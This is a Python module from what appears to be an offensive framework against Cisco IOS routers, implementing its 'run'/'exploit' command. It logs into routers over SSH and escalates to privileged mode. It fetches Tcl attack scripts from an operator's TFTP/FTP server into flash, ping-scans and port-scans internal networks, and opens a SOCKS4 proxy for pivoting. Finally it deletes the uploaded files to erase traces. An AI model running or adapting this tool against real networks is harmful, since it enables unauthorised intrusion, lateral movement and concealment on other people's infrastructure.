import ipaddress
import asyncio
import logging
import random
import netdev
import json

from pathlib import Path

from src.core.classes.base.BaseCommand import BaseCommand

from src.core.registry.OptionRegistry import OptionRegistry

from src.core.handlers.CiscoIOSHandler import CiscoIOSHandler

logging.basicConfig(level=logging.WARNING)
netdev.logger.setLevel(logging.WARNING)


class RunCommand(BaseCommand):
    """The RunCommand class to execute on user-supplied command"""

    helper = {
        'name': ['run', 'exploit'],
        'help': 'This command start the connection process',
        'usage': 'run, exploit'
    }

    def __init__(self, command: str, print_queue: asyncio.Queue):
        super().__init__()
        self.command = command
        self.print_queue = print_queue
        self.global_options = OptionRegistry()
        self.current_device = None

    async def main(self) -> None:
        """Class method to start the command logic"""
        await self.execute()

    async def execute(self) -> None:
        """Class method to execute the command logic"""
        await self.parse_options()

    async def parse_options(self) -> None:
        """Class method to parse GlobalOptionRegistry values"""
        pq = self.print_queue
        options = {
            'host': self.global_options.get_registry_value('host'),
            'username': self.global_options.get_registry_value('username'),
            'password': self.global_options.get_registry_value('password'),
            'device_type': self.global_options.get_registry_value('device_type'),
            'secret': self.global_options.get_registry_value('secret'),
            'device_file': self.global_options.get_registry_value('device_file'),
            'tftp_server': self.global_options.get_registry_value('tftp_server'),
            'tftp_server_ip': self.global_options.get_registry_value('tftp_server_ip'),
            'ftp_server': self.global_options.get_registry_value('ftp_server'),
            'ftp_server_ip': self.global_options.get_registry_value('ftp_server_ip'),
            'ftp_server_port': self.global_options.get_registry_value('ftp_server_port'),
            'ping_scan': self.global_options.get_registry_value('ping_scan'),
            'port_scan': self.global_options.get_registry_value('port_scan'),
            'port_list': self.global_options.get_registry_value('port_list'),
            'socks_proxy': self.global_options.get_registry_value('socks_proxy'),
            'socks_port': self.global_options.get_registry_value('socks_port'),
            'pivot_point': self.global_options.get_registry_value('pivot_point'),
            'pivot_internal_host': self.global_options.get_registry_value('pivot_internal_host'),
            'pivot_internal_port': self.global_options.get_registry_value('pivot_internal_port'),
            'pivot_port': self.global_options.get_registry_value('pivot_port')
        }

        if not options['host'] and not options['device_file']:
            await pq.put(('error', 'You have set target options first!'))
            return

        if options['tftp_server'] == 'true' and not options['tftp_server_ip']:
            await pq.put(('error', 'You have to set the "tftp_server_ip" option when using a TFTP server'))
            return

        if options['ftp_server'] == 'true' and not options['ftp_server_ip']:
            await pq.put(('error', 'You have to set the "ftp_server_ip" option when using a FTP server'))
            return

        if options['tftp_server'] == 'false' and options['ftp_server'] == 'false':
            await pq.put(('error', 'You need to enable at least one file transfer method in the options'))
            return

        if options['port_scan'] == 'true' and not options['port_list']:
            options['port_list'] = '80,134-139,443,445,3389'

        if options['socks_proxy'] == 'true' and not options['socks_port']:
            options['socks_port'] = random.randint(32767, 65535)

        if options['host'] and options['username'] and options['password'] and options['device_type']:
            device = {
                'host': options['host'],
                'username': options['username'],
                'password': options['password'],
                'device_type': options['device_type'],
                'secret': options['secret']
            }
            task = asyncio.ensure_future(self.process_connection(options, device))
            await asyncio.gather(task)

        elif options['device_file']:
            if not Path(options['device_file']).is_file():
                await pq.put(('error', f'Error occurred when accessing the file "{options["device_file"]}"\n'))
                return
            with open(options['device_file'], 'r') as f:
                devices = json.loads(f.read())

            tasks = []
            for dev in devices:
                task = asyncio.ensure_future(self.process_connection(options, devices[dev]))
                tasks.append(task)
            await asyncio.gather(*tasks)

    async def process_connection(self, options: dict, device: dict):
        """Class coroutine used to establish a connection with a custom connector"""
        handler = CiscoIOSHandler(device)
        pq = self.print_queue
        host = device['host']
        device_hosts = []
        device_ifaces = []
        device_networks = []
        device_pivot_points = []
        filenames = ['services.list', 'iosmap.tcl', 'iosproxy.tcl']

        try:
            username = device['username']
            password = device['password']
            await pq.put(('bold', f'Attempting SSH connection on host {host}...'))
            async with netdev.create(**device, timeout=3600) as ios:
                await pq.put(('success', f'[{host}] - Login Successful using {username} and {password}'))

                # Check for Priv Shell
                if not await handler.check_enable_mode(ios):
                    await pq.put(('error', f'[{host}] - User failed to enter privileged mode.  Skipping host...'))
                    return
                await pq.put(('success', f'[{host}] - User succeeded in entering privileged mode on the device'))

                # Check TCL support
                output = await handler.check_tcl_mode(ios)
                if not output:
                    await pq.put(('error', f'[{host}] - TCL mode not supported on target device. Skipping host...'))
                    return
                await pq.put(('success', f'[{host}] - TCL mode supported on the target device'))

                # Gather Interfaces
                device_ifaces += await handler.get_interfaces(ios)
                if len(device_ifaces) == 0:
                    await pq.put(('error', f'[{host}] - No interfaces found in running config.  Skipping host...'))
                    return
                await pq.put(('success', f'[{host}] - Interfaces discovered on the target device: {device_ifaces}'))

                # Gather Networks
                device_networks += await handler.get_networks(ios)
                if len(device_networks) == 0:
                    await pq.put(('error', f'[{host}] - Search found no networks in running config.  Skipping host...'))
                    return
                await pq.put(('success', f'[{host}] - Networks discovered on the target device: {device_networks}'))

                # Gather TCL scripts
                await pq.put(('success', f'[{host}] - Gathering the required files needed for process...'))
                for file in filenames:
                    await pq.put(('success', f'[{host}] - Checking flash memory for the file "{file}"...'))
                    if await handler.check_flash_file(file, ios):
                        await pq.put(('success', f'[{host}] - File "{file}" already found in flash memory'))
                        continue
                    if options['tftp_server'] == 'true' and options['tftp_server_ip']:
                        await pq.put(('success', f'[{host}] - Attempting Trivial-FTP transfer of file "{file}"...'))
                        if await handler.file_download_tftp(options['tftp_server_ip'], file, ios):
                            await pq.put(('success', f'[{host}] - File "{file}" successfully downloaded via TFTP!'))
                            continue
                        else:
                            await pq.put(('error', f'[{host}] - File "{file}" failed to download via TFTP...'))
                    if options['ftp_server'] == 'true' and options['ftp_server_ip']:
                        await pq.put(('success', f'[{host}] - Attempting FTP transfer of file "{file}"...'))
                        if await handler.file_download_ftp(options['ftp_server_ip'], file, ios):
                            await pq.put(('success', f'[{host}] - File "{file}" successfully downloaded via FTP!'))
                            continue
                        else:
                            await pq.put(('error', f'[{host}] - File "{file}" failed to download via FTP...'))
                for file in filenames:
                    if not await handler.check_flash_file(file, ios):
                        await pq.put(('error', f'[{host}] - Failed to download files. Skipping host...'))
                        return

                # Ping Scan?
                if options['ping_scan'] != 'true':
                    await pq.put(('error', f'[{host}] - Ping scan setting disabled in options. Skipping ping scan...'))
                else:
                    for net in device_networks:
                        if ipaddress.IPv4Network(net, False).prefixlen in range(1, 16):
                            await pq.put(('warning', f'[{host}] - Network too large for scan. Skipping ping scan...'))
                            continue
                        if ipaddress.IPv4Network(net, False).prefixlen in range(17, 20):
                            size = 4
                        elif ipaddress.IPv4Network(net, False).prefixlen in range(21, 25):
                            size = 2
                        else:
                            size = 0
                        await pq.put(('warning', f'[{host}] - Breaking network {net} into chunks for processing...'))
                        network_sub = await handler.get_subnet_chunks(size, ipaddress.IPv4Network(net, False))
                        for sub in network_sub:
                            await pq.put(('success', f'[{host}] - Starting host discovery on network segment {sub}'))
                            device_hosts += await handler.ping_scan_network(sub, ios)
                    if len(device_hosts) == 0:
                        await pq.put(('warning', f'[{host}] - The host discovery process did not find any live hosts'))
                    else:
                        for ihost in device_hosts:
                            await pq.put(('success', f'[{device["host"]}] --> Internal host {ihost} is up'))

                # Port Scan?
                if options['port_scan'] == 'false':
                    await pq.put(('warning', f'[{host}] - Skipping internal port scans due to option settings...'))
                elif len(device_hosts) == 0:
                    await pq.put(('warning', f'[{host}] - No live hosts found to port scan...'))
                else:
                    for ihost in device_hosts:
                        await pq.put(('success', f'[{host}] - Starting port scan on host {ihost}...'))
                        device_pivot_points += await handler.port_scan_tcp(options['port_list'], ihost, ios)
                if len(device_pivot_points) == 0:
                    await pq.put(('error', f'[{device["host"]}] - Discovery process didnt find any open ports'))
                else:
                    for pivot_point in device_pivot_points:
                        ip, port = pivot_point
                        await pq.put(('success', f'[{host}] - Discovered port {port} open on internal host {ip}'))

                # Proxy Setup
                if options['socks_proxy'] == 'true':
                    port = options['socks_port']
                    await pq.put(('success', f'[{host}] - Attempting to start SOCKS4 Proxy server on port {port}'))
                    await handler.setup_proxy(port, ios)

                # Clean up flash memory artifacts
                for file in filenames:
                    if not await handler.check_flash_file(file, ios):
                        continue
                    else:
                        await pq.put(('success', f'[{device["host"]}] - Deleting file "{file}" from flash memory...'))
                        if await handler.del_flash(file, ios):
                            await pq.put(('success', f'[{device["host"]}] - File "{file}" successfully deleted!'))
                            continue
                        else:
                            if not await handler.check_flash_file(file, ios):
                                await pq.put(('success', f'[{device["host"]}] - File "{file}" successfully deleted!'))
                                continue
                            else:
                                await pq.put(('error', f'[] - Problem occurred when deleting "{file}"" from memory?!'))

        except netdev.DisconnectError:
            await pq.put(('error', f'[{host}] - Host Disconnected...'))

        except netdev.TimeoutError:
            await pq.put(('error', f'[{host}] - Host Connection Timed Out...'))
